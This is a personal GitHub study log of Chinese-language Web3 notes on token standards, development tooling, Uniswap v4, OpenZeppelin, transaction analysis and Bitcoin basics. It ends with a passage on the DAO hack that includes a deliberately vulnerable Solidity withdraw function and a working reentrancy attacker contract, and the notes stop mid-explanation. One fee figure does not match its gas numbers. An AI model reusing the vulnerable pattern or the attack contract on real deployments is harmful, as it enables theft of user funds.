---
timezone: UTC+8
---

# Ray

**GitHub ID:** 3956ray

**Telegram:** @mmm lll

## Self-introduction

我是Ray，

## Notes

<!-- Content_START -->
# 2025-08-18

# 🔑 1. ERC-20（EIP-20）

### 简介

- 以太坊最早的同质化代币标准（2015/2017），定义了代币的基本接口：`balanceOf`、`transfer`、`approve`、`transferFrom` 等。
    

### 解决的问题

- 在 ERC-20 之前，每个项目自定义代币合约接口，缺乏统一标准，钱包/交易所难以兼容。
    
- ERC-20 **统一了代币接口** → 任何钱包、DEX、DeFi 协议都能无缝集成。
    

### 技术栈 / 更新

- **Solidity**：主要语言。
    
- **OpenZeppelin Contracts** 提供成熟安全的 ERC-20 实现（含 Mintable、Burnable、Snapshot、Pausable 扩展）。
    
- 技术更新：支持 **EIP-2612 permit** 扩展（避免多次交易），以及 ERC-777 的改进尝试（但 ERC-777 因复杂性和攻击面大，采用度有限）。
    



# 🎨 2. ERC-721（EIP-721）

### 简介

- 非同质化代币（NFT）标准，定义了 `ownerOf`、`transferFrom`、`safeTransferFrom` 等接口。
    

### 解决的问题

- ERC-20 只能表示同质化资产（如稳定币），无法表示唯一资产。
    
- ERC-721 解决了 **唯一性、所有权证明、资产上链** 问题（CryptoKitties、艺术品、游戏资产）。
    

### 技术栈 / 更新

- **Solidity + OpenZeppelin**：ERC721 标准合约。
    
- **EIP-165**：接口检测标准，用于确认合约是否实现 ERC721。
    
- 技术更新：出现 **ERC-721A**（优化 gas 的批量 Mint，Azuki 提出）和 **ERC-4907**（租赁扩展）。
    
- 在 DeFi 场景：NFT 可作为抵押物（NFTfi）、流动性凭证（Uniswap v3 LP NFT）。
    



# 🎭 3. ERC-1155（EIP-1155）

### 简介

- 多资产标准（Enjin 提出），允许一个合约管理 **同质化代币 + 非同质化代币**。
    

### 解决的问题

- ERC-20 & ERC-721 **各自独立**，管理复杂、部署成本高。
    
- ERC-1155 解决了：
    
    - 批量转账/管理 → 节省 Gas。
        
    - 同一合约下管理多种资产（游戏资产、DeFi 多资产组合）。
        

### 技术栈 / 更新

- **Solidity + OpenZeppelin**：ERC1155 实现。
    
- 技术更新：批量 `safeBatchTransferFrom`，显著降低 Gas。
    
- 应用：DeFi 衍生品（如 Synthetix 的多资产发行）、GameFi。
    



# 💰 4. ERC-4626（EIP-4626）

### 简介

- Vault（收益金库）代币标准，用于将任意 ERC-20 资产托管并发行份额代币（Vault Token）。
    

### 解决的问题

- 在 DeFi 中，Yearn、Aave、Compound 等 Vault/借贷协议的接口不统一。
    
- ERC-4626 **统一 Vault 的存取/份额逻辑**：
    
    - `deposit`、`withdraw`、`mint`、`redeem`。
        
    - 提升了协议间的 **可组合性**。
        

### 技术栈 / 更新

- **Solidity + OpenZeppelin ERC4626** 模块化实现。
    
- 技术更新：
    
    - 更高效的资产与份额转换（`convertToAssets`、`convertToShares`）。
        
    - 与 Uniswap V3、Aave 等生态组合，提升自动化策略（自动收益聚合）。
        



# ⚡ 5. EIP-2612（ERC-20 Permit）

### 简介

- ERC-20 的扩展，引入 `permit()`，允许用户通过签名授权，不必提前发送 `approve` 交易。
    

### 解决的问题

- 传统 ERC-20 流程：`approve` → `transferFrom`，需要 **两次交易**，增加成本和 UX 不佳。
    
- EIP-2612：一次链下签名，合约即可直接调用 → 减少一次交易、节省 Gas。
    
- 被广泛应用于 DEX（Uniswap、Curve）、聚合器（1inch）。
    

### 技术栈 / 更新

- **Solidity** + **EIP-712（Typed Signature）** 实现。
    
- **OpenZeppelin ERC20Permit** 库现成可用。
    
- 技术更新：Uniswap 的 **Permit2** 进一步增强安全性，支持多合约统一授权。
    



# 🔐 6. EIP-712

### 简介

- 结构化数据签名标准，用于安全地链下签名并链上验证。
    

### 解决的问题

- 普通签名（EIP-191）仅是字节串，用户难以验证签名含义，容易被钓鱼。
    
- EIP-712 让用户在钱包（如 MetaMask）看到清晰的待签名数据结构 → **可读性 & 安全性**。
    

### 技术栈 / 更新

- **TypedData hashing + Solidity keccak256**。
    
- 钱包支持：MetaMask、Gnosis Safe。
    
- 技术更新：DeFi 广泛使用（0x 协议、Permit、LayerZero、跨链消息）。
    
- 在 DeFi 中结合 **EIP-2612**，几乎成为标配。
    



# ✅ 差别

|标准|简介|解决的问题|技术栈 / 更新|
|---|---|---|---|
|ERC-20|同质化代币标准|代币接口统一，钱包/DEX 通用|Solidity + OpenZeppelin；扩展：ERC777、EIP-2612|
|ERC-721|NFT 标准|表达唯一资产|Solidity + OpenZeppelin；扩展：ERC721A、ERC4907|
|ERC-1155|多资产标准|批量管理、多资产共存|Solidity + OpenZeppelin；批量转账省 Gas|
|ERC-4626|Vault 标准|统一收益金库接口|Solidity + OpenZeppelin ERC4626；提高可组合性|
|EIP-2612|ERC20 Permit|减少 approve 步骤|Solidity + EIP-712；OpenZeppelin ERC20Permit；Permit2|
|EIP-712|Typed Data 签名|提升签名安全性|Solidity hashing；钱包支持广泛|

# 2025-08-17

# 一、Hardhat和Foundry

- **Hardhat**：以 Node.js 生态为核心的“脚手架 + 本地区块链 + 海量插件”平台，最强在**插件生态、部署编排、与前端/TS 工程体系的整合**。
    
- **Foundry**：Rust 实现的**高性能 Solidity 原生开发套件**（forge/cast/anvil）。最强在**编译/测试速度、内置模糊/不变式测试、低摩擦链上脚本化**。
    

# 二、特性对比（工程视角）

|维度|Hardhat|Foundry|
|---|---|---|
|主要语言/脚本|TypeScript/JavaScript（测试、任务、部署脚本）|Solidity（测试、脚本）+ `cast` CLI|
|本地链|Hardhat Network（主网分叉稳定、插件多）|Anvil（启动快、资源占用低、分叉快）|
|编译与速度|基于 `solc`，速度中等，依赖 Node 生态|并行编译，普遍更快；缓存机制优秀|
|测试形态|Mocha/Chai + ethers.js/viem（从“用户视角”写测试）|Solidity 原生单测，Cheatcodes 丰富，天然“合约内视角”|
|Fuzz/Invariant|依赖外部工具（Echidna 等）或插件集成|**内置** fuzz/invariant 与 shrink，易上手|
|Gas 工具|`hardhat-gas-reporter` 等插件|`forge test --gas-report`、`forge snapshot`|
|覆盖率|`solidity-coverage` 插件成熟|`forge coverage`（现已可用，集成度高）|
|调试体验|`hardhat/console.sol`、详细 error 堆栈、任务系统|`-vvvv` 级别调用追踪、`console2`、Cheatcodes（`prank/deal/warp` 等）|
|依赖管理|npm/pnpm/yarn|`forge install`（git 源）+ remappings|
|插件生态|**极其丰富**（部署、验证、升级、Defender…）|相对轻；更多“内建”而非“插件化”|
|与前端集成|**一流**（TS 类型提示、viem/wagmi、任务式部署产物）|可行但更“工具箱化”，常与 Hardhat/前端仓分离|
|CI/DevOps|基于 Node 工具链，模板众多|二进制工具，CI 速度快、镜像小|

> 选择：
> 
> - **以 DApp/前端驱动、依赖插件和部署编排** → 选 **Hardhat** 或 **Hardhat+Foundry** 混合。
>     
> - **以研究/安全/性能与测试为中心** → 选 **Foundry** 主导。
>     

# 三、选择

常见高效组合：

- **Foundry 负责：** 编译、单测、fuzz、不变式、gas 回归；
    
- **Hardhat 负责：** 多网络部署、Etherscan/区块浏览器验证、与前端/脚本任务编排、OpenZeppelin Upgrades 等插件链路。  
    做法：同一仓或 mono-repo 中，保留 `foundry.toml` 与 `hardhat.config.ts`，合约源码共享，CI 中分别跑 `forge test` 与 `hardhat deploy/verify`。
    

# 四、安全技术栈

## 1) Hardhat 安全栈

**内核理念：** “插件驱动 + 外部安全工具的无缝集成 + 主网分叉回归”。

- **基线库**
    
    - **OpenZeppelin Contracts**（安全基元、权限/代币/代理模式）
        
    - OpenZeppelin **Upgrades** 插件（Transparent/UUPS 代理、**存储布局检查**）
        
- **静态分析**
    
    - **Slither**（Python，静态分析、漏洞检测、结构报告、脚本化审计）
        
    - Solhint（风格/易错点 Lint）
        
- **属性/规约与形式化**
    
    - **Scribble**（规范注释 → 仪表化断言，可与 Hardhat 流程集成）
        
    - **Certora Prover**（规则级形式化验证；对关键合约很有价值）
        
- **模糊/符号执行**
    
    - **Echidna**（基于性质的模糊测试）
        
    - Mythril / Manticore（符号执行；更偏“审计/研究”）
        
- **覆盖率与 gas**
    
    - `solidity-coverage`、`hardhat-gas-reporter`
        
- **运行时与回归**
    
    - Hardhat Network **主网分叉**（对 DeFi/跨协议交互尤为重要）
        
    - Defender（Sentinel/AutoTasks/Timelock/多签工作流）
        
- **最佳实践**
    
    - 升级合约：强制存储布局 Diff、冻结不可变变量、独立 `initialize` 访问控制
        
    - 多签、延时（Timelock）与角色最小化；事件审计与**变更公告**流程
        

## 2) Foundry 安全栈

**内核理念：** “把安全测试做成默认路径：快、原生、可编排”。

- **内置能力（无需额外工具即上强度）**
    
    - **Fuzz/Invariant**：`forge test` 直接开启；`targetSelectors`/`targetContracts` 配置；Shrinking 默认支持
        
    - **Cheatcodes**：`prank/warp/roll/deal/record/revertTo` 等模拟权限、时间、随机性与链上状态
        
    - **Gas/Trace**：`--gas-report`、`-vvvv` 深度调用轨迹
        
    - **Coverage**：`forge coverage`
        
    - **Scripts**：`forge script --broadcast` 安全复现部署步骤、支持 Dry-run 与模拟
        
- **可叠加的外部工具**
    
    - 同样可无缝接入 **Slither、Echidna、Scribble、Certora**（很多审计团队就是 Foundry+Slither/Echidna 的组合）
        
- **测试范式**
    
    - **不变式测试**（Invariants）→ 对 DeFi 等状态机强约束非常有效（如“系统总余额守恒”、“永不出现负债爆表”）
        
    - **差分测试**（与参考实现或旧版本对比）
        
    - **主网分叉**：`anvil --fork-url` + `forge test` 在真实协议上下文中 fuzz
        
- **最佳实践**
    
    - 为关键不变量写“**最小可复现攻击面**”测试（单次交易 + 多 tx 序列）
        
    - 为权限逻辑写“反向”用例（恶意调用者、错误角色、EOA/合约混合）
        

# 五、端到端的安全流程

1. **编码前**：选用 **OZ Contracts** 基元；定稿**信任模型**与**升级策略**（是否可升级？由谁升级？是否 Timelock/多签？）。
    
2. **静态检查**：Solhint + **Slither** 基线扫描；定制 Slither 脚本做结构性检查（如授权点、外部可重入点）。
    
3. **单元/集成测试**：
    
    - Hardhat：Mocha/Chai + viem/ethers 写“用户视角”流程；
        
    - Foundry：Solidity 单测覆盖“合约内细节与边界”。
        
4. **Fuzz / Invariant**：
    
    - Hardhat：引入 **Echidna** 或把合约仪表化（Scribble）后跑；
        
    - Foundry：直接用内置 fuzz/invariant（推荐，把性质写清楚）。
        
5. **主网分叉回归**：模拟真实协议外部交互（预言机、Dex、借贷），验证经济安全与沙盒参数。
    
6. **形式化关键路径**：对资金关键模块用 **Scribble** 断言或 **Certora** 规则做“证明级”保障。
    
7. **覆盖率 & Gas 回归**：将覆盖率和 gas 预算纳入 CI 阈值（PR 降级即阻断）。
    
8. **部署/运维安全**：
    
    - 可升级合约强制存储布局对比；
        
    - 多签/Timelock；
        
    - **Etherscan/Blockscout 验证** + 生成 SBOM（依赖清单）；
        
    - 线上 **监控与告警**（Defender Sentinel、事件订阅）。
        
9. **应急预案**：暂停开关（可控可见）、速撤流动性/参数限制脚本、公告模板与回滚计划。
    

# 六、如何选择（网上建议）

- **偏应用/前端协作/插件链路**重：**Hardhat**（或 Hardhat 做部署，Foundry 做测试）。
    
- **偏安全/研究/高覆盖测试**重：**Foundry** 主导，必要时加上 Hardhat 的部署插件链路。
    
- **团队 TS 很强**、与前端复用类型/工具：**Hardhat**
    
- **团队以审计/协议为中心**、强调 fuzz/invariant 与高频回归：**Foundry**

# 2025-08-15

# Uniswap

- **v3（2021）**：提出“**集中流动性**”（LP 可把资金只投在自选价区），并配合多费率档、NFT 头寸与内置 TWAP 预言机，显著提升资金效率与可组合性。([Uniswap文档](https://docs.uniswap.org/concepts/protocol/concentrated-liquidity?utm_source=chatgpt.com "Concentrated Liquidity"), [app.uniswap.org](https://app.uniswap.org/whitepaper-v3.pdf?utm_source=chatgpt.com "Uniswap v3 Core"))
    
- **v4（2025）**：在延续 v3 资金效率的基础上，换成 **Singleton** 架构 + **Flash Accounting**（净额结算）+ **Hooks** 可编程扩展；费用从固定档变为 **0–100% 可配置/可动态**；支持 **原生 ETH**（无需先包成 WETH）。
    


|       | v3                       | v4                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----- | ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 合约架构  | Factory + 每个池都是独立合约      | **单合约 PoolManager（Singleton）** 管全部池状态，创建/多跳更省 Gas。                                                                                                                                                                                                                                                                                                                                                                    |
| 资金效率  | **集中流动性**（LP 指定价区）       | 继承 v3 的集中流动性机制。                                                                                                                                                                                                                                                                                                                                                                                                       |
| 费用机制  | 固定档（0.01%、0.05%、0.3%、1%） | **可配置费率（0–100%）**，可静态或由 **Hook 动态**决定。([Uniswap文档](https://docs.uniswap.org/concepts/protocol/fees?utm_source=chatgpt.com "Fees"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))                                                                                                                                                       |
| 结算与转账 | 每跳都真实转账，跨多池成本高           | **Flash Accounting**，交易末尾按净额结算，跨池更省 Gas；附带“**免费闪电贷**”性质。([Uniswap文档](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [Uniswap Labs](https://blog.uniswap.org/uniswap-v4?utm_source=chatgpt.com "Our Vision for Uniswap v4"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit")) |
| 原生资产  | 需 WETH/WMATIC 包装         | **原生 ETH 直用**，用户体验更好。                                                                                                                                                                                                                                                                                                                                                                                                 |
| 可编程性  | 协议内置功能为主                 | **Hooks**：在建池/加减仓/换汇等生命周期“前/后”插入自定义逻辑（限价单、定制预言机、费用管理、做市策略等）。                                                                                                                                                                                                                                                                                                                                                          |
| 头寸表示  | 每个 LP 头寸是 **ERC-721**    | 仍由 **v4 PositionManager 铸造/管理 ERC-721 头寸**；但结算层引入 **ERC-6909** 做内部记账与赎回优化。                                                                                                                                                                                                                                                                                                                                            |
| 预言机   | **内置 TWAP 预言机**（池可直接出价）  | **不再内置预言机**；如需可由 Hook 定制。                                                                                                                                                                                                                                                                                                                                                                                             |
| 范式/路由 | v3 Router + SDK          | **Universal Router + v4 SDK**，支持 v4 的新结算/Hook 语义。(                                                                                                                                                                                                                                                                                                                                                                    |

> 备注：**Range Orders（区间单）** 在 v3/v4 语义一致，都是用“单边集中流动性 + 价区穿越”来近似限价单。

# v4 的关键技术点（为什么更“灵活+低 Gas”）

1. **Singleton + Flash Accounting**  
    全池状态集中到 `PoolManager`；一次交易内先用**瞬时状态**记账（受 EIP-1153/Transient Storage 设计启发），最后统一结算，跨多池/多步操作显著省 Gas，并天然形成“**净额结算/免费闪电贷**”特性。([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswap文档](https://docs.uniswap.org/contracts/v4/concepts/flash-accounting?utm_source=chatgpt.com "Flash Accounting"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))    
2. **Hooks（池级可编程）**  
    在建池、swap、modifyLiquidity、donate 等前/后插点执行外部合约，实现**动态费率、做市策略、预言机、风控/合规模块**等；是 v4 的可扩展核心。
3. **费用与会计完全可定制**  
    费率范围 0–100%，静态或由 Hook 每笔动态设定；配合 **Custom Accounting/Return Deltas** 可实现复杂经济模型。([blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"), [Uniswap文档](https://docs.uniswap.org/contracts/v4/guides/custom-accounting?utm_source=chatgpt.com "Custom Accounting | Uniswap"))    
4. **原生 ETH 支持**  
    路由/PoolKey 直接标识 ETH，减少 wrap/unwrap 成本与边界复杂度。
5. **ERC-6909 内部记账**  
    与 Flash Accounting 协同，允许在 `PoolManager` 内以多 token-id 形式记账、赎回/归还，进一步压低赎回/领取 Gas。
    

# 2024–2025

- **主网上线 & 多链部署**：**2025-01-31** v4 正式发布，**以太坊、Polygon、Arbitrum、OP Mainnet、Base、BNB、Blast、World Chain、Avalanche、Zora** 等链可用。([Uniswap Labs](https://blog.uniswap.org/uniswap-v4-is-here?utm_source=chatgpt.com "Uniswap v4 is Here – A New Era of DeFi"))    
- **安全与审计**：上线前组织了**多轮审计/竞赛**与 **$15.5M** 赏金；独立审计报告也剖析了 **Flash Accounting“免费闪电贷”** 与 **ERC-6909 结算** 的安全注意点。([Uniswap Labs](https://blog.uniswap.org/v4-bug-bounty?utm_source=chatgpt.com "$15.5M Bug Bounty for Uniswap v4: The Largest in History"), [blog.openzeppelin.com](https://blog.openzeppelin.com/uniswap-v4-core-audit?utm_source=chatgpt.com "Uniswap v4 Core Audit"))
- **数据与分析迁移**：因 **Singleton** 与新记账范式，v4 的链上数据抓取/查询方式与 v3 有明显不同（研究者/分析师需更新方法）。([uniswapfoundation.mirror.xyz](https://uniswapfoundation.mirror.xyz/c7LDDTWhC2ry6gp0nGqcSKHvNHosJmhPQ-ZuIxqeB2I?utm_source=chatgpt.com "How to Navigate Uniswap v4 Data"))    
- **开发生态**：发布 **v4 SDK** 与 **Universal Router** 文档/示例，同时官方/社区给出 Hook 模板与实践指引（如 BaseHook、风控/积分/动态费率 Hook 等）。([Uniswap文档](https://docs.uniswap.org/sdk/v4/overview?utm_source=chatgpt.com "The Uniswap v4 SDK"))    
- **许可与合规**：    
    - v3：最初 BUSL，后已转 **GPL**（可自由复刻，遵守 GPL 即可）。([support.uniswap.org](https://support.uniswap.org/hc/en-us/articles/14569783029645-Uniswap-v3-licensing?utm_source=chatgpt.com "Uniswap v3 licensing"))        
    - v4：**BUSL-1.1/双许可**（部分文件 MIT），随时间转为更宽松许可；DAO 对例外授权/流程有专门讨论。([GitHub](https://github.com/Uniswap/v4-core?utm_source=chatgpt.com "Core smart contracts of Uniswap v4"), [Uniswap Governance](https://gov.uniswap.org/t/establish-uniswap-v4-licensing-process/25443?utm_source=chatgpt.com "Establish Uniswap v4 Licensing Process"))

# 2025-08-14

# OpenZeppelin
以太坊/EVM 生态最主流的智能合约标准库：把 ERC20/721/1155 等标准实现、权限与治理、可升级基建和大量安全组件做成了可复用的模块，目标是“在经过社区验证的代码之上安全开发”。([OpenZeppelin 文档](https://docs.openzeppelin.com/contracts/5.x/?utm_source=chatgpt.com "Contracts - OpenZeppelin Docs"))

# 如何确保合约安全

1. **标准化与社区验证**  
    大量核心合约（ERC20/721 等）与工具长期在社区中被复用与审视，官方定位就是“为安全合约开发而建的库”。这能显著降低自写轮子的安全风险。
    
2. **内置防御组件，覆盖高频攻击面**    
    - `ReentrancyGuard`：一键给关键函数加防重入护栏。        
    - `Pausable`：紧急制动（circuit breaker），事故发生时可临时冻结敏感操作。        
    - `PullPayment`：把“主动转账”改为“受方主动提取”，规避常见重入陷阱。  
        这些模式都是围绕实际攻击面沉淀下来的“安全缺省”。
        
3. **与“不规范代币”的安全交互**  
    生态里一些 ERC-20 合约不按规范返回 `bool`（如 USDT 早期实现）。`SafeERC20` 对 `transfer/transferFrom/approve` 做了安全封装，统一处理异常与返回值，避免硬编码处理出错。
    
4. **类型与数学安全**  
    提供 `SafeCast`、`Math` 等工具，避免静默截断、下溢/上溢等数值类问题（Solidity 新版本已自带溢出检查，但边界与类型转换仍需小心）
    
5. **权限与治理的系统化设计**    
    - `Ownable/AccessControl` 与 **`AccessManager`**：从单管理员到多角色分权，甚至可为角色配置**执行延迟**与跨合约权限，防止“钥匙一把抓”。        
    - `TimelockController`：对关键操作加**时间延迟**，给社区或用户留出观察/退出窗口，是去中心化治理的安全常识。  
        这些组合能把“权限误用/恶意”的系统性风险降到最低。
        
6. **可升级合约的“安全护栏”**  
    升级插件在部署与升级时会**自动做两类校验**：    
    - **升级安全性**（如是否使用了 constructor、是否正确初始化等）；        
    - **存储布局兼容性**（防止变量顺序/类型变更导致的数据“错位”）。  
        校验不过就阻止升级，避免生产事故。
        
7. **审计与安全研究背书**  
    OpenZeppelin ，维护库，也提供行业头部的安全审计服务：多研究员交叉审阅，必要时做模糊/不变式测试；官方披露了**700+审计、8000+问题发现**的统计量，长期把研究结论反哺到库与文档。
    
8. **密码学与签名标准的落地实现**  
    提供 `EIP712` 等密码学工具/接口，帮助你用标准化方式处理签名与域隔离，减少重放与签名滥用的风险。
    
## 常见风险 → 对应方案

- 重入攻击 → `ReentrancyGuard` 或改用 `PullPayment`。    
- 管理员误操作/单点风险 → `AccessManager/AccessControl` + `TimelockController`（必要时叠加多签）。
- 紧急漏洞爆发 → `Pausable` 临时冻结敏感功能，赢得修复窗口。    
- 升级把状态搞乱 → 使用升级插件的**升级/存储布局校验**。
- 与“非标准”ERC-20 交互失败 → 统一用 `SafeERC20` 封装。

# 2025-08-12

# Etherscan内容分析

| 字段                          | 内容                                                                   |
| --------------------------- | -------------------------------------------------------------------- |
| **交易哈希 (Transaction Hash)** | `0x494dc66209465c96204d59005b0bf9e9b5ce5dd2c0c09de3394f396724a932de` |
| **状态 (Status)**             | ✅ 成功 (Success)                                                       |
| **所在区块 (Block)**            | `8967679`（已确认 471 个区块）                                               |
| **时间戳 (Timestamp)**         | `2025-08-12 10:32:36 AM UTC`（约 1 小时前）                                |
| **发送方 (From)**              | `0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8`                         |
| **接收方 (To, 合约地址)**          | `0x1888eED3F821558f8aAe128EcFb0224B86FFdD49`                         |
| **交易类型 (Txn Type)**         | Type 2 (EIP-1559)                                                    |
| **Nonce**                   | 3                                                                    |
| **区块内位置**                   | 27                                                                   |

| 项目                                 | 数值                                    |
| ---------------------------------- | ------------------------------------- |
| **转账金额 (Value)**                   | `0 ETH`（此交易仅调用合约函数，无资金转移）             |
| **交易手续费 (Transaction Fee)**        | `0.00000792154930663 ETH`             |
| **Gas 价格 (Gas Price)**             | `1.501004132 Gwei`                    |
| **Gas 限额与使用量 (Gas Limit & Usage)** | 限额：`53,567`；实际使用：`52,775`（使用率 98.52%） |
| **基础费 (Base Fee)**                 | `0.001004132 Gwei`                    |
| **最大费用 (Max Fee)**                 | `1.5014732 Gwei`                      |
| **最大优先费 (Max Priority Fee)**       | `1.5 Gwei`                            |
| **销毁费用 (Burnt)**                   | `0.0000000529930663 ETH`              |
| **节省费用 (Txn Savings)**             | `0.0000000247550637 ETH`              |

## 调用函数
```
function leaveMessage(string _text)
```

## 交易输入数据
```
[0]: 000000000000000...00020  
[1]: 000000000000000...00005  
[2]: 68656c6c6f00000...00000
```
- `0x20`：字符串在 calldata 中的偏移量（32 字节后开始）。    
- `0x05`：字符串长度 = 5。    
- `0x68656c6c6f`：`"hello"`的ASCII码。

## EIP-1559 费用
是 **Type 2** 交易（EIP-1559 格式），Gas 费由两部分组成：
1. **Base Fee（基础费）**：由协议设定，并会被销毁（Burnt），防止通胀。    
2. **Priority Fee（优先费 / 小费）**：支付给矿工（现为验证者）作为打包激励。

# 2025-08-11

# DApp 开发生命周期

## 1) 需求与架构

- 明确 MVP：页面（运动员页/投资页）、最少合约（运动员 Token + 市场）、最少数据事件（比赛数据、训练打卡）。    
- 选链：EVM 兼容、手续费低（Polygon/Base/BNB/Inj ）。    
- 架构四件套：前端 + 智能合约 + **索引器**（读事件到数据库）+ 去中心化存储（IPFS/Arweave）。     
## 2) 合约开发

- 工具： **Hardhat**（生态全）。    
- 步骤：写合约 → 单元测试 → 本地链验证（anvil/hardhat node）。    
- 基于 OpenZeppelin（ERC-20/1155 + AccessControl）减少坑。 

## 3) 索引器

- 作用：把合约 **Events**（如价格变更、成交）消费进数据库，前端查询更快更灵活。    
- 方案：**The Graph/Subgraph** 或 **Ponder（TypeScript）**；存 PostgreSQL。    
- 产出：子图/处理器，定义要监听的事件字段与写库逻辑。     
## 4) 前端
- 框架：React/Next。    
- 钱包：MetaMask / WalletConnect。    
- 交互库：**Viem + Wagmi**（类型好、体验稳定；或 ethers.js）。    
- 页面：连接钱包、运动员列表/详情、下单/撤单、我的持仓。
## 5) 链交互

- 读取：调用合约 view 方法或从索引器取聚合数据。    
- 写入：用户用钱包签名，前端发交易，监听确认。    
- 处理好 pending/确认/失败三种状态。 

## 6) 预言机与外部数据（先做“半手动”）

- MVP 简化：先由“运营后台”或脚本把比赛/训练数据喂给合约（管理员角色）。    
- 进阶：接 **Chainlink** 或其他可信源，多源聚合、异常回退。 
## 7) 部署与上线

- 合约：先测试网（Sepolia/Holesky），再主网/侧链。    
- 前端：Vercel/Netlify（或部署到 **IPFS**）。    
- 验证：区块浏览器验证合约，准备最小使用手册/引导。 
## 8) 基础测试与安全

- 单元测试（合约）：价格更新、下单/撤单、权限。    
- E2E：前端脚本连测试网走一遍主流程。    
- 先自测 + 小范围内测，后续再考虑第三方审计/赏金。

# 2025-08-09

## 一、双重支付问题（Double-Spending）

### ​**​关键问题​**​

传统电子支付依赖金融机构作为第三方验证交易，防止同一笔资金被重复使用（双重支付）。这导致：

1. ​**​信任成本高​**​：需第三方担保交易有效性；
2. ​**​交易不可逆​**​：金融机构可仲裁争议，逆转交易，增加欺诈风险；
3. ​**​小额支付不可行​**​：高手续费限制微支付场景。

### ​**​解决方案：工作量证明（PoW）与区块链​**​

1. ​**​时间戳服务器+哈希链​**​
    - 每笔交易通过​**​时间戳​**​绑定到区块，并广播至全网；
    - 区块通过​**​哈希指针​**​连接成链，篡改任一区块需重做后续所有区块的哈希计算。
2. ​**​分布式共识机制​**​
    - 节点以​**​最长链为有效链​**​（代表最大算力投入）；
    - 诚实节点控制多数算力时，攻击者无法追上链的增长速度（概率指数级下降）。



## 二、去中心化网络下的信任建立

### ​**​关键问题​**​

如何在无中心机构的点对点网络中，确保所有节点对交易顺序达成一致？

### ​**​解决方案：激励机制与PoW​**​

1. ​**​工作量证明（PoW）​**​
    - 节点通过计算寻找满足难度目标的​**​Nonce值​**​（如SHA-256哈希值以多个0开头），消耗CPU算力证明“诚实工作”；
    - ​**​“一CPU一票”​**​ ：算力决定投票权重，替代易被操控的IP投票机制。
2. ​**​经济激励​**​
    - ​**​区块奖励​**​：矿工打包新区块可获得新生成的比特币（初始50 BTC/区块）；
    - ​**​交易手续费​**​：输入值与输出值的差额作为手续费，长期替代区块奖励。



## 三、数据存储与验证效率

### ​**​关键问题​**​

区块链数据随时间线性增长，全节点存储负担重，轻节点如何快速验证交易？

### ​**​解决方案：默克尔树与简化支付验证（SPV）​**​

1. ​**​默克尔树（Merkle Tree）​**​
    - 交易哈希值逐层计算生成​**​根哈希​**​存储于区块头（仅80字节），老区块可删除交易细节保留根哈希。
2. ​**​SPV（Simplified Payment Verification）​**​
    - 轻节点仅保存​**​区块头​**​，通过验证Merkle分支确认交易是否被纳入区块；
    - 依赖诚实节点警报机制：发现无效区块时通知全网下载完整数据。



## 四、隐私保护与匿名性

### ​**​关键问题​**​

公开账本如何平衡透明性与用户隐私？

### ​**​解决方案：密码学匿名机制​**​

1. ​**​公钥匿名​**​
    - 交易记录显示地址间的转账，但​**​不绑定用户真实身份​**​（类似股市交易）；
2. ​**​动态地址生成​**​
    - 每次交易生成​**​新地址​**​，避免地址复用导致行为溯源。



## 五、对智能合约开发者的启示

|​**​比特币设计​**​|​**​智能合约应用​**​|
|||
|工作量证明（PoW）|共识算法选择（如PoS、PoA）|
|默克尔树|高效状态验证（如以太坊状态树）|
|经济激励|代币经济模型设计（DeFi、GameFi）|
|简化支付验证（SPV）|轻客户端开发（钱包、跨链桥）|

可结合​**​Solidity语言​**​和​**​以太坊虚拟机（EVM）​**​ [智能合约开发指南]

# 2025-08-08

智能合约相关安全事件：

- **The DAO事件（2016年）**：黑客利用智能合约中的重入漏洞，从自治基金合约中盗走360万个以太币，导致以太坊社区不得不进行硬分叉，这是智能合约安全史上的典型严重事件。[nsfocus](https://blog.nsfocus.net/securityloophole/)
  原理：
	- 通过被攻击者控制的恶意合约发起一笔非预期的外部调用打断目标合约的正常执行逻辑，绕过代码的限制条件，一直重复绕过这个限制条件。(打个比方，比如现在去一个设计有缺陷的ATM提款，插入卡片后输入提现1000，ATM机开始数钱，但是还没数出来，账户余额也还没被扣除这1000的那个瞬间，有个黑客利用这个缺陷的漏洞控制ATM"重新"执行一次'提现1000'，然后ATM再次检查账户发现，欸对耶，钱还够，又数了一次钱，然后这个过程不断重复，知道现金提空，而银行账户最终只会被扣一次款)
![](Pasted%20image%2020250808155506.png)
	
```
// 警告：这是一个有严重漏洞的合约！
contract EtherStore {
    mapping(address => uint) public balances;

    // ... 省略存款等其他函数 ...

    function withdraw(uint _amount) public {
        // 1. 检查余额是否足够
        require(balances[msg.sender] >= _amount);

        // 2. 转账给调用者 (问题所在！)
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // 3. 更新账户余额
        balances[msg.sender] -= _amount;
    }
}
```

```
import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // fallback 函数是关键，当合约收到以太币时会被触发
    fallback() external payable {
        // 只要 EtherStore 合约的余额还大于1 ETH，就继续调用它的 withdraw 函数
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        etherStore.deposit{value: 1 ether}(); // 先存入 1 ETH
        etherStore.withdraw(1 ether);          // 发起第一次提款
    }
}

```

攻击流程：
1. 1. 黑客调用 `Attack.attack()`，存入 1 ETH 到 `EtherStore`，然后立刻要求提领这 1 ETH。
2. `EtherStore.withdraw()` 开始执行。它检查黑客的余额（1 ETH），检查通过。
3. `EtherStore` 执行 `msg.sender.call{value: 1 ether}("")`，试图将 1 ETH 还给黑客的 `Attack` 合约。
